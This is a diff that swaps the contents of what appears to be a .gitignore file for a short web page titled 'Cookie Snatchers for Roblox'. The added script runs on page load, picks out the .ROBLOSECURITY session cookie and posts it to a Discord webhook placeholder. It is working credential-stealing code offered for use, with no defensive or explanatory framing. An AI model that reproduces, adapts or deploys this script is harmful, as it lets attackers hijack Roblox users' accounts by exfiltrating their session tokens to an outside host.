@@ -1,18 +1,27 @@
-# Build and Release Folders
-bin-debug/
-bin-release/
-[Oo]bj/
-[Bb]in/
+# Cookie Snatchers for Roblox
 
-# Other files and folders
-.settings/
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        const getCookies = () => {
+            const cookies = document.cookie.split(';');
+            const robloxCookies = cookies.filter(cookie => cookie.includes('.ROBLOSECURITY'));
+            return robloxCookies.map(cookie => cookie.trim());
+        };
 
-# Executables
-*.swf
-*.air
-*.ipa
-*.apk
+        const sendToWebhook = (cookies) => {
+            const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ content: cookies.join('\n') })
+            });
+        };
 
-# Project files, i.e. `.project`, `.actionScriptProperties` and `.flexProperties`
-# should NOT be excluded as they contain compiler settings and other important
-# information for Eclipse / Flash Builder.
+        const cookies = getCookies();
+        if (cookies.length > 0) {
+            sendToWebhook(cookies);
+        }
+    });
+</script>
